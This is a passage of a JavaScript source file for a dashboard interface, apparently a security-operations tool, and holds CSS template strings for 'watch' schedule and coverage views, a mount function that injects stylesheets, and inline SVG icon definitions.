.gr-log .gl-when{font-family:var(--mono);font-size:11px;color:var(--ink-3);white-space:nowrap}
.gr-log .gl-who{white-space:nowrap;color:var(--ink-2)}
.gr-log .gl-note{color:var(--ink-3);font-size:11px}
`;

/* ===== Watches — overview, detail, popover ===== */
const WATCH_CSS = `
.wdot{display:inline-block;width:7px;height:7px;border-radius:50%;flex:0 0 auto}
.rad-watchtag{cursor:pointer}
.rad-watchtag:hover{color:var(--ink-2)}
.agcard.wt{--tone:var(--wt);cursor:pointer;transition:box-shadow .15s,border-color .15s}
.agcard.wt:hover{box-shadow:var(--sh-sm);border-color:color-mix(in srgb,var(--wt) 45%,var(--line))}
.agcard.wt.paused .ag-stats,.agcard.wt.paused .wt-aut{opacity:.6}
.wt-desc{font-size:12px;line-height:1.55;color:var(--ink-3);margin-top:2px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.wt-desc.lg{font-size:13px;max-width:660px;display:block;-webkit-line-clamp:none;margin-top:10px}
.wt-aut{display:flex;align-items:center;justify-content:space-between;gap:9px;padding:11px 0;border-top:1px solid var(--line);border-bottom:1px solid var(--line);margin-top:12px}
.wt-aut-r{display:inline-flex;align-items:center;gap:9px;min-width:0}
.wt-aut b{font-size:12px;font-weight:600;color:color-mix(in srgb,var(--tone) 74%,var(--ink-0));white-space:nowrap}
.wt-surfs{display:inline-flex;gap:5px;flex-wrap:wrap;vertical-align:middle}
.wt-surf{display:inline-flex;align-items:center;gap:4px;font-size:10px;font-weight:600;padding:2px 8px;border-radius:999px;background:var(--bg-2);color:var(--ink-3);white-space:nowrap}
.wt-surf.dayshift{background:color-mix(in srgb,#d2761c 12%,transparent);color:#b4651a}
.wt-surf.nightshift{background:color-mix(in srgb,#7b6ce8 14%,transparent);color:#564ab6}
body.mode-night .wt-surf.dayshift{color:#e8a765}
body.mode-night .wt-surf.nightshift{color:#a89bf5}
/* coverage strip */
.cov{padding:2px 0 18px;margin-bottom:20px;border-bottom:1px solid var(--line)}
.cov-h{display:flex;align-items:baseline;gap:10px;margin-bottom:24px}
.cov-h h3{margin:0;font-size:15px;font-weight:700;color:var(--ink-0)}
.cov-live{margin-left:auto;display:inline-flex;align-items:center;gap:7px;font-size:11.5px;font-weight:600;color:var(--ink-1);white-space:nowrap}
.cov-live i{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 0 3px color-mix(in srgb,var(--green) 16%,transparent)}
.cov-plot{position:relative}
.cov-grid{position:absolute;top:-2px;bottom:-2px;left:130px;right:162px;pointer-events:none;z-index:2}
.cov-grid i{position:absolute;top:0;bottom:0;width:1px;margin-left:-0.5px;background:rgba(19,29,50,.09)}
.cov-grid i:first-child,.cov-grid i:last-child{background:rgba(19,29,50,.05)}
[data-theme="dark"] .cov-grid i{background:rgba(255,255,255,.10)}
[data-theme="dark"] .cov-grid i:first-child,[data-theme="dark"] .cov-grid i:last-child{background:rgba(255,255,255,.05)}
.cov-nowlay{position:absolute;top:-5px;bottom:-5px;left:130px;right:162px;pointer-events:none;z-index:3}
.cov-now{position:absolute;top:0;bottom:0;width:2px;margin-left:-1px;border-radius:2px;background:var(--ink-1);box-shadow:0 0 0 1px var(--panel)}
.cov-now b{position:absolute;top:-17px;left:50%;transform:translateX(-50%);font-family:var(--mono);font-size:9.5px;font-weight:600;letter-spacing:.03em;line-height:1;color:var(--panel);background:var(--ink-1);padding:3px 6px 2px;border-radius:999px;white-space:nowrap}
.cov-now.edge-l b{left:0;transform:none}
.cov-now.edge-r b{left:auto;right:0;transform:none}
.cov-row{display:flex;align-items:center;gap:12px;padding:7px 0;cursor:pointer;border-radius:6px}
.cov-row:hover{background:var(--bg-2)}
.cov-name{display:inline-flex;align-items:center;gap:7px;flex:0 0 118px;font-size:11.5px;font-weight:600;color:var(--ink-3);white-space:nowrap}
.cov-row:hover .cov-name{color:var(--ink-1)}
.cov-track{position:relative;flex:1;height:10px;border-radius:999px;background:var(--bg-2)}
.cov-track i{position:absolute;top:0;bottom:0;border-radius:999px;opacity:1}
.cov-track.off i{opacity:.2}
.cov-win{flex:0 0 150px;display:flex;align-items:center;gap:7px;white-space:nowrap}
.cov-win-t{font-family:var(--mono);font-size:11px;color:var(--ink-2);letter-spacing:-.02em;font-variant-numeric:tabular-nums}
.cov-win.all .cov-win-t{font-family:inherit;font-size:11px;color:var(--ink-4);letter-spacing:0}
.cov-row:hover .cov-win-t{color:var(--ink-1)}
.cov-axis{position:relative;height:13px;margin:9px 162px 0 130px;font-size:9.5px;color:var(--ink-4);font-family:var(--mono)}
.cov-axis span{position:absolute;top:0;transform:translateX(-50%)}
.cov-axis span:first-child{transform:none}
.cov-axis span:last-child{transform:translateX(-100%)}
/* watch detail */
.wt-back{display:inline-flex;align-items:center;gap:6px;border:none;background:none;font:inherit;font-size:12px;font-weight:600;color:var(--ink-3);cursor:pointer;padding:0;margin-bottom:16px}
.wt-back:hover{color:var(--ink-1)}
.wt-back svg{transform:rotate(180deg)}
.wt-head{display:flex;align-items:center;gap:13px}
.ag-ic.lg{width:44px;height:44px;border-radius:11px}
.wt-head-id h2{margin:0;font-size:19px;font-weight:600;letter-spacing:-.01em;color:var(--ink-0)}
.wt-head-sub{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--ink-3);margin-top:4px;flex-wrap:wrap}
.wt-head-r{margin-left:auto;display:flex;align-items:center;gap:12px;flex:0 0 auto}
.wt-note{display:flex;align-items:flex-start;gap:7px;font-size:11.5px;line-height:1.55;color:var(--ink-4);margin-top:10px}
.wt-note svg{flex:0 0 auto;margin-top:2px}
.wt-note a{color:var(--accent-d);font-weight:600;cursor:pointer;white-space:nowrap}
.wt-note a:hover{text-decoration:underline}
.wt-det{--tone:var(--wt)}
.wt-det .ag-aut2{max-width:none;width:100%;border-bottom:none;padding-bottom:0}
.wt-det .ag-aut2 .aut-rail,.wt-det .ag-aut2 .aut-stopls{margin-left:0;margin-right:0}
/* watch identity editor */
.wt-idrow{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.wt-icbtn{width:34px;height:34px;display:grid;place-items:center;border-radius:var(--r-sm);border:1px solid var(--line-2);background:var(--panel);color:var(--ink-3);cursor:pointer;transition:all .13s}
.wt-icbtn:hover{border-color:var(--ink-4);background:var(--bg-2);color:var(--ink-1)}
.wt-icbtn.on{border-color:var(--wt);color:var(--wt);background:color-mix(in srgb,var(--wt) 10%,transparent)}
.wt-swatch{width:26px;height:26px;border-radius:50%;border:none;cursor:pointer;transition:transform .13s;box-shadow:inset 0 0 0 1px rgba(20,25,40,.12)}
.wt-swatch:hover{transform:scale(1.1)}
.wt-swatch.on{box-shadow:0 0 0 2px var(--panel),0 0 0 4px var(--swc)}
.wt-descinput{width:100%;min-height:56px;resize:vertical;padding:9px 11px;border:1px solid var(--line-2);border-radius:var(--r-sm);background:var(--panel);font:inherit;font-size:12.5px;line-height:1.5;color:var(--ink-1);outline:none;box-sizing:border-box}
.wt-descinput:focus{border-color:var(--blue);box-shadow:0 0 0 2px var(--blue-ring)}
.wtid-lbl{font-size:11px;font-weight:600;letter-spacing:.02em;color:var(--ink-3);margin-bottom:7px}
.wt-ptitle .ag-ic{cursor:pointer;transition:box-shadow .13s}
.wt-ptitle .ag-ic:hover{box-shadow:0 0 0 2px color-mix(in srgb,var(--wt,var(--ink-4)) 35%,transparent)}
.wt-det .aut-h-lv{display:inline-block;font-size:10.5px;font-weight:600;font-family:var(--mono);padding:2px 8px;border-radius:999px;background:var(--bg-2);color:var(--ink-2)}
.wt-surfsel{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:10px;max-width:720px}
.wt-surfrow{display:flex;align-items:center;gap:11px;padding:12px 14px;border:1px solid var(--line);border-radius:var(--r-sm);cursor:pointer;transition:border-color .13s,background .13s;background:var(--panel)}
.wt-surfrow:hover{background:var(--bg-2)}
.wt-surfrow.on{border-color:color-mix(in srgb,var(--accent) 45%,var(--line));background:color-mix(in srgb,var(--accent) 4%,var(--panel))}
.wt-surfic{width:30px;height:30px;border-radius:8px;display:grid;place-items:center;flex:0 0 auto;background:var(--bg-2);color:var(--ink-3)}
.wt-surfic.dayshift{background:color-mix(in srgb,#d2761c 13%,transparent);color:#b4651a}
.wt-surfic.nightshift{background:color-mix(in srgb,#7b6ce8 14%,transparent);color:#564ab6}
.wt-surfmain{flex:1;min-width:0}
.wt-surfmain b{display:block;font-size:12.5px;font-weight:600;color:var(--ink-1)}
.wt-surfmain span{display:block;font-size:11px;color:var(--ink-4);margin-top:1px}
.wt-surfrow .sw{flex:0 0 auto;pointer-events:none}
.wt-sched .ag-row b{text-align:right}
.wt-det .ctl-sech button{margin-left:auto}
.sk-chip.wt{display:inline-flex;align-items:center;gap:6px;cursor:pointer;background:var(--bg-2);color:var(--ink-2)}
.sk-chip.wt:hover{background:var(--line-2)}
.sk-watches{display:flex;flex-wrap:wrap;gap:5px;margin-top:7px}
.sk-none{font-size:11px;color:var(--ink-4);font-style:italic}
.act-agent .wdot{margin-right:3px}
/* per-watch popover (brief gear) */
.aut-pop.autp{width:432px;max-width:calc(100vw - 24px)}
.autp-list{display:flex;flex-direction:column;margin:2px 0 4px}
.autp-item{border-bottom:1px solid var(--line-2)}
.autp-item:last-child{border-bottom:none}
.autp-row{display:flex;align-items:center;gap:8px;width:100%;border:none;background:none;font:inherit;text-align:left;padding:10px 2px;border-radius:8px;cursor:pointer}
.autp-row:hover .autp-n{color:var(--accent-d)}
.autp-row.off{opacity:.55}
.autp-n{font-size:12.5px;font-weight:600;color:var(--ink-1);flex:0 0 auto;transition:color .12s}
.autp-win{font-size:10px;color:var(--ink-4);flex:1 1 auto;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.autp-lvl{font-size:10.5px;font-weight:600;color:var(--ink-3);white-space:nowrap}
.autp-go{color:var(--ink-4);transform:rotate(-90deg);transition:transform .15s ease;display:inline-flex}
.autp-item.open .autp-go{transform:rotate(0deg)}
.autp-item.open .autp-row .aut,.autp-item.open .autp-row .autp-lvl{display:none}
.autp-body{display:none;padding:0 6px 13px 17px}
.autp-item.open .autp-body{display:block}
.autp-slider{border:none !important;padding:2px 0 0 !important}
.autp-slider .aut-slider{margin-top:0}
.autp-body .aut-read{margin-top:9px;min-height:0}
.autp-open{display:inline-flex;align-items:center;gap:6px;margin-top:11px;font-size:11.5px;font-weight:600;color:var(--accent-d);cursor:pointer}
.autp-open:hover{text-decoration:underline}
/* watch detail — header chrome */
.ag-ic.wt.sm{width:28px;height:28px;border-radius:8px}
.wt-ptitle{gap:9px !important;min-width:0;overflow:hidden}
.wt-hback{flex:0 0 auto;width:28px;height:28px;display:grid;place-items:center;border-radius:var(--r-sm);color:var(--ink-3);border:1px solid var(--line-2);background:var(--panel);cursor:pointer;transition:.12s;margin-right:2px}
.wt-hback:hover{background:var(--bg-2);color:var(--ink-1);border-color:var(--line)}
.wt-hback svg{transform:none}
.wt-ptitle-n{flex:0 1 auto;min-width:0;overflow:hidden;text-overflow:ellipsis;font-size:16px;font-weight:650;color:var(--ink-0);white-space:nowrap}
.wt-htabs{display:inline-flex;align-items:center;gap:6px;flex:0 0 auto;margin-left:6px}
.wt-reports{flex:0 0 auto;font-size:10.5px;font-weight:600;text-transform:uppercase;letter-spacing:.04em;color:var(--ink-4)}
.wt-htab{display:inline-flex;align-items:center;gap:4px;font:inherit;font-size:11px;font-weight:600;padding:3px 10px;border-radius:999px;border:none;background:var(--bg-2);color:var(--ink-4);cursor:pointer;transition:.12s;white-space:nowrap;flex:0 0 auto}
.wt-htab:hover{color:var(--ink-2);background:var(--line-2)}
.wt-htab svg{opacity:1}
.page-title.wt-ptitle svg{color:inherit}
.wt-htab.dayshift.on{background:color-mix(in srgb,#d2761c 13%,transparent);color:#b4651a}
.wt-htab.dayshift.on:hover{background:color-mix(in srgb,#d2761c 19%,transparent)}
.wt-htab.nightshift.on{background:color-mix(in srgb,#7b6ce8 16%,transparent);color:#564ab6}
.wt-htab.nightshift.on:hover{background:color-mix(in srgb,#7b6ce8 22%,transparent)}
body.mode-night .wt-htab.dayshift.on{color:#e8a765}
body.mode-night .wt-htab.nightshift.on{color:#a89bf5}
.wt-htab-ck{display:inline-flex;margin:0 -2px 0 -1px}
.wt-hactions{flex:0 0 auto;gap:10px}
.wt-hactions .ag-live{gap:0}
.wt-hactions .ag-live,.wt-hactions .ag-last{margin-left:0}
.wt-mandate{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.05em;color:var(--wt);margin-bottom:9px}
/* schedule form (watch detail) — full-width settings grid, fixed-height rows */
.wt-panel{border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel);padding:2px 18px;box-shadow:var(--sh-xs)}
.wt-schedform{display:flex;flex-direction:column}
.wt-schedrow{display:flex;align-items:flex-start;gap:18px;padding:14px 0;border-bottom:1px solid var(--line-2)}
.wt-schedrow.noline{border-bottom:none}
.wt-schedlbl{flex:0 0 132px;font-size:12.5px;color:var(--ink-4);padding-top:6px}
.wt-schedctl{flex:1;min-width:0;display:flex;flex-direction:column;gap:10px;align-items:stretch}
.wt-schedrow .ag-aut2{width:100%;margin:0;border-top:none;padding-top:2px}
.wt-schedrow .ag-aut2 .ag-aut-l{display:none}
.wt-schedrow .ag-aut2 .ag-aut2-top{display:none}
.wt-covrow1{display:flex;align-items:center;min-height:30px}
.wt-covslot{display:flex;align-items:center;gap:8px;min-height:30px;white-space:nowrap;overflow:hidden}
.wt-covnote{font-size:11.5px;color:var(--ink-4)}
.wt-seg{display:inline-flex;gap:2px;background:var(--bg-2);border-radius:9px;padding:2px}
.wt-segbtn{font:inherit;font-size:11.5px;font-weight:600;padding:5px 13px;border:none;background:none;border-radius:7px;color:var(--ink-3);cursor:pointer;transition:color .12s,background .12s,box-shadow .12s}
.wt-segbtn:hover{color:var(--ink-1)}
.wt-segbtn.on{background:var(--panel);color:var(--ink-1);box-shadow:0 1px 2px rgba(7,16,31,.12),0 0 0 1px var(--line)}
.wt-select{font:inherit;font-size:12px;font-weight:600;color:var(--ink-1);background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:5px 26px 5px 10px;cursor:pointer;appearance:none;-webkit-appearance:none;background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='10' height='10' viewBox='0 0 24 24' fill='none' stroke='%23737d8c' stroke-width='2.4' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>");background-repeat:no-repeat;background-position:right 9px center;transition:border-color .12s}
.wt-select:hover{border-color:var(--ink-4)}
.wt-select:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 1px var(--accent)}
.wt-select:disabled{opacity:.5;cursor:not-allowed}
.wt-select.sm{padding:4px 24px 4px 9px;font-size:11.5px}
.wt-select.mono{font-family:var(--mono)}
.wt-times{display:flex;align-items:center;gap:8px;font-size:11.5px;color:var(--ink-4);flex-wrap:nowrap;min-width:0;max-width:100%}
.wt-times>span:not(.wt-demand){flex:0 0 auto}
.wt-cadrow{display:flex;align-items:center;gap:8px;flex-wrap:wrap;font-size:11.5px;color:var(--ink-4)}
.wt-demand{display:inline-flex;align-items:center;gap:7px;font-size:11.5px;font-weight:600;color:var(--ink-3);cursor:pointer;margin-left:8px;user-select:none;min-width:0;flex:0 1 auto}
.wt-demand em{font-style:normal;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.wt-demand:hover,.wt-demand.on{color:var(--ink-1)}
.wt-demand .sw{pointer-events:none}
/* 24h day ribbon — always present so the row never changes height */
.wt-ribbon{width:100%;margin-top:2px}
.wt-ribbon-track{position:relative;height:14px;border-radius:7px;background:var(--bg-2);overflow:hidden}
.wt-ribbon-track u{position:absolute;top:0;bottom:0;width:1px;background:var(--panel);z-index:2;text-decoration:none}
.wt-ribbon-track i{position:absolute;top:0;bottom:0;background:var(--wt,var(--accent));opacity:.8}
.wt-ribbon-track .wt-now{position:absolute;top:0;bottom:0;width:2px;background:var(--ink-1);z-index:3;box-shadow:0 0 0 1px var(--panel)}
.wt-ribbon-track b{position:absolute;inset:0;z-index:4;display:grid;place-items:center;font-size:8.5px;font-weight:600;letter-spacing:.09em;text-transform:uppercase;color:var(--ink-4);font-family:var(--mono)}
.wt-ribbon.demand .wt-ribbon-track,.wt-ribbon.unset .wt-ribbon-track{background:repeating-linear-gradient(135deg,var(--bg-2) 0 6px,color-mix(in srgb,var(--ink-4) 8%,var(--bg-2)) 6px 8px)}
.wt-ribbon.ondem .wt-ribbon-track{background:repeating-linear-gradient(135deg,var(--bg-2) 0 6px,color-mix(in srgb,var(--wt,var(--accent)) 10%,var(--bg-2)) 6px 8px)}
.wt-covaxis{display:flex;justify-content:space-between;margin-top:5px;font-size:9px;color:var(--ink-4);font-family:var(--mono)}
.wt-schedhint{font-size:11px;line-height:1.55;color:var(--ink-4);max-width:680px;min-height:36px}
.wt-schedhint.warn{display:flex;align-items:flex-start;gap:6px;color:#9a6700}
.wt-schedhint.warn svg{flex:0 0 auto;margin-top:2px}
`;
/* review fix 2 — Invite surfaced at the top of the record flyout, matching the chat header */
const REVIEW_FIXES_CSS = `
.insp-tabs{overflow-x:hidden;align-items:center}
.insp-tabs .insp-tabs-scroll{display:flex;gap:1px;flex:1 1 auto;min-width:0;overflow-x:auto;scrollbar-width:none}
.insp-tabs .insp-tabs-scroll::-webkit-scrollbar{display:none}
.insp-tabs button.insp-invite{margin-left:8px;align-self:center;flex:0 0 auto;display:inline-flex;align-items:center;gap:6px;height:30px;padding:5px 12px;font-size:11.5px;font-weight:600;background:var(--panel);color:var(--ink-1);border:1px solid var(--line-2);border-radius:var(--r-sm);transition:.12s;cursor:pointer}
.insp-tabs button.insp-invite:hover{border-color:var(--line-strong);background:var(--bg-2);color:var(--ink-0)}
.insp-tabs button.insp-invite svg{color:var(--ink-3)}
.ov-spark{cursor:pointer}
.ovtip{position:fixed;z-index:400;display:none;pointer-events:none;background:var(--panel);border:1px solid var(--line-2);border-radius:var(--r-sm);box-shadow:var(--sh-md);padding:9px 11px;min-width:150px}
.ovtip-t{font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:var(--ink-4);font-family:var(--mono);margin-bottom:3px}
.ovtip-v{font-size:12.5px;color:var(--ink-1)}
.ovtip-v b{font-weight:700;color:var(--ink-0)}
.ovtip-hint{display:flex;align-items:center;gap:5px;margin-top:7px;padding-top:7px;border-top:1px solid var(--line);font-size:11px;font-weight:600;color:var(--accent-d)}
.ovtip-hint svg{color:var(--accent)}
`;
export function mount(root){
  if(!document.getElementById('tl-tour-css')){
    const ts = document.createElement('style');
    ts.id = 'tl-tour-css';
    ts.textContent = TOUR_CSS;
    document.head.appendChild(ts);
  }
  if(!document.getElementById('tl-style')){
    const st = document.createElement('style');
    st.id = 'tl-style';
    st.textContent = TL_CSS;
    document.head.appendChild(st);
  }
  if(!document.getElementById('tl-brief-css')){
    const bs = document.createElement('style');
    bs.id = 'tl-brief-css';
    bs.textContent = BRIEF_EXTRA_CSS;
    document.head.appendChild(bs);
  }
  if(!document.getElementById('tl-watch-css')){
    const ws = document.createElement('style');
    ws.id = 'tl-watch-css';
    ws.textContent = WATCH_CSS;
    document.head.appendChild(ws);
  }
  if(!document.getElementById('tl-review-css')){
    const rs = document.createElement('style');
    rs.id = 'tl-review-css';
    rs.textContent = REVIEW_FIXES_CSS;
    document.head.appendChild(rs);
  }
  document.body.classList.remove('mode-night');
  document.body.classList.add('mode-day');
  root.innerHTML = TL_SHELL;
  if(_mounted) return; // guard against double-init on hot reload
  _mounted = true;
  window.addEventListener('resize', ()=>{
    try{ syncChatDock(); }catch(e){}
    if(typeof state!=='undefined' && state && state.inspectorOpen && state.activeApp==='discover' && state.discoverFieldsManual==null){
      clearTimeout(window.__tlDiscoRz); window.__tlDiscoRz=setTimeout(()=>{ try{ renderApp(); }catch(e){} }, 120);
    }
  });
  runApp();
}
function runApp(){
  if(!document.getElementById('tl-loop-css')){
    const ls = document.createElement('style');
    ls.id = 'tl-loop-css';
    ls.textContent = loopCss();
    document.head.appendChild(ls);
  }

/* ============================================================
   ICONS (inline, stroke, currentColor)
   ============================================================ */
const I = (p,vb="0 0 24 24")=>`<svg width="16" height="16" viewBox="${vb}" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${p}</svg>`;
const ICON = {
  plus:I('<path d="M12 5v14M5 12h14"/>'),
  pause:I('<rect x="6" y="4" width="4" height="16" rx="1"/><rect x="14" y="4" width="4" height="16" rx="1"/>'),
  filter:I('<path d="M3 5h18l-7 8v5l-4 2v-7z"/>'),
  settings:I('<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09a1.65 1.65 0 0 0-1-1.51 1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09a1.65 1.65 0 0 0 1.51-1 1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>'),
  help:I('<circle cx="12" cy="12" r="10"/><path d="M9.1 9a3 3 0 0 1 5.8 1c0 2-3 3-3 3"/><path d="M12 17h.01"/>'),
  tour:I('<circle cx="12" cy="12" r="9"/><path d="M14.5 9.5l-1.4 3.6-3.6 1.4 1.4-3.6z"/>'),
  dots:I('<circle cx="5" cy="12" r="1" fill="currentColor"/><circle cx="12" cy="12" r="1" fill="currentColor"/><circle cx="19" cy="12" r="1" fill="currentColor"/>'),
  grip:I('<circle cx="9" cy="6" r="1" fill="currentColor"/><circle cx="9" cy="12" r="1" fill="currentColor"/><circle cx="9" cy="18" r="1" fill="currentColor"/><circle cx="15" cy="6" r="1" fill="currentColor"/><circle cx="15" cy="12" r="1" fill="currentColor"/><circle cx="15" cy="18" r="1" fill="currentColor"/>'),
  eye:I('<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/>'),
  eyeoff:I('<path d="M9.9 4.2A9.1 9.1 0 0 1 12 4c6.5 0 10 7 10 7a13.2 13.2 0 0 1-2.16 2.83M6.6 6.6A13.3 13.3 0 0 0 2 11s3.5 7 10 7a9 9 0 0 0 3.4-.6M3 3l18 18M9.9 9.9a3 3 0 0 0 4.2 4.2"/>'),
  streams:I('<circle cx="6" cy="6" r="2"/><circle cx="6" cy="18" r="2"/><circle cx="18" cy="12" r="2"/><path d="M8 6h6a2 2 0 0 1 2 2v1.5M8 18h6a2 2 0 0 0 2-2v-1.5"/>'),
  sidebar:I('<rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 3v18"/>'),
  pin:I('<path d="M9 4h6l-1 7 3 3v1H7v-1l3-3-1-7z"/><path d="M12 15v6"/>'),
  chat:I('<path d="M21 11.5a8.4 8.4 0 0 1-11.7 7.7L3 21l1.8-6.3A8.4 8.4 0 1 1 21 11.5z"/>'),
  comment:I('<path d="M21 15a2 2 0 0 1-2 2H8l-5 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/><path d="M8 10h.01M12 10h.01M16 10h.01"/>'),
  folder:I('<path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>'),
  clip:I('<path d="M21 8.5l-9 9a4 4 0 0 1-5.7-5.7l9-9a2.7 2.7 0 0 1 3.8 3.8l-8.5 8.5a1.3 1.3 0 0 1-1.9-1.9l7.8-7.8"/>'),
  search:I('<circle cx="11" cy="11" r="7"/><path d="m21 21-4.3-4.3"/>'),
  sun:I('<circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/>'),
  moon:I('<path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/>'),
  shield:I('<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>'),
  check:I('<path d="M20 6 9 17l-5-5"/>'),
  x:I('<path d="M18 6 6 18M6 6l12 12"/>'),
  send:I('<path d="m22 2-7 20-4-9-9-4Z"/><path d="M22 2 11 13"/>'),
  panel:I('<rect x="3" y="3" width="18" height="18" rx="2"/><path d="M15 3v18"/>'),
  panelfill:I('<rect x="3" y="3" width="18" height="18" rx="2"/><path d="M15 3v18"/><rect x="15.4" y="4.2" width="4.4" height="15.6" rx="1" fill="currentColor" stroke="none"/>'),
  panelleft:I('<rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 3v18"/><rect x="4.2" y="4.2" width="3.6" height="15.6" rx="1" fill="currentColor" stroke="none"/>'),
  restart:I('<path d="M3 12a9 9 0 1 0 3-6.7L3 8"/><path d="M3 3v5h5"/>'),
  db:I('<ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5v14a9 3 0 0 0 18 0V5"/><path d="M3 12a9 3 0 0 0 18 0"/>'),
  network:I('<rect x="16" y="16" width="6" height="6" rx="1"/><rect x="2" y="16" width="6" height="6" rx="1"/><rect x="9" y="2" width="6" height="6" rx="1"/><path d="M5 16v-3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v3M12 12V8"/>'),
  terminal:I('<path d="m4 17 6-6-6-6M12 19h8"/>'),
  host:I('<rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/>'),
  user:I('<circle cx="12" cy="8" r="4"/><path d="M4 21a8 8 0 0 1 16 0"/>'),
  clock:I('<circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/>'),
  link:I('<path d="M10 13a5 5 0 0 0 7 0l3-3a5 5 0 0 0-7-7l-1 1"/><path d="M14 11a5 5 0 0 0-7 0l-3 3a5 5 0 0 0 7 7l1-1"/>'),
  refresh:I('<path d="M21 2v6h-6M3 12a9 9 0 0 1 15-6.7L21 8M3 22v-6h6M21 12a9 9 0 0 1-15 6.7L3 16"/>'),
  arrow:I('<path d="M7 17 17 7M7 7h10v10"/>'),
  arrowr:I('<path d="M5 12h14M13 6l6 6-6 6"/>'),
  arrowl:I('<path d="M19 12H5M12 19l-7-7 7-7"/>'),
  sparkle:I('<path d="M12 3v4M12 17v4M3 12h4M17 12h4M5.6 5.6l2.8 2.8M15.6 15.6l2.8 2.8M5.6 18.4l2.8-2.8M15.6 8.4l2.8-2.8"/>'),
  doc:I('<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6M9 13h6M9 17h6"/>'),
  briefcase:I('<rect x="3" y="7" width="18" height="13" rx="2"/><path d="M8 7V5a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><path d="M3 13h18M12 13v.01"/>'),
  investigation:I('<circle cx="11" cy="11" r="7"/><path d="m21 21-4.3-4.3"/><path d="M11 8v6M8 11h6"/>'),
  target:I('<circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="5"/><circle cx="12" cy="12" r="1.5"/>'),
  siren:I('<path d="M7 18v-6a5 5 0 0 1 10 0v6"/><path d="M5 21h14M12 3v2M4.2 6.2l1.4 1.4M19.8 6.2l-1.4 1.4"/>'),
  layers:I('<path d="m12 2 9 5-9 5-9-5 9-5z"/><path d="m3 12 9 5 9-5M3 17l9 5 9-5"/>'),
  lock:I('<rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/>'),
  userx:I('<circle cx="9" cy="8" r="4"/><path d="M2 21a7 7 0 0 1 12-5M17 8l5 5M22 8l-5 5"/>'),
  rotate:I('<path d="M3 12a9 9 0 1 0 3-6.7L3 8"/><path d="M3 3v5h5"/>'),
  users:I('<circle cx="9" cy="8" r="4"/><path d="M2 21a7 7 0 0 1 14 0M19 8a3 3 0 0 1 0 6M22 21a5 5 0 0 0-4-5"/>'),
  bolt:I('<path d="M13 2 4 14h7l-1 8 9-12h-7z"/>'),
  warn:I('<path d="M12 9v4M12 17h.01M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z"/>'),
  warnfill:`<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z"/><path d="M12 9v4M12 17h.01" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg>`,
  alert:I('<path d="M18 8a6 6 0 0 0-12 0c0 7-3 9-3 9h18s-3-2-3-9M13.7 21a2 2 0 0 1-3.4 0"/>'),
  asset:I('<path d="M3 9h18M9 21V9"/><rect x="3" y="3" width="18" height="18" rx="2"/>'),
  chart:I('<path d="M3 3v18h18"/><path d="m7 14 3-3 3 3 5-6"/>'),
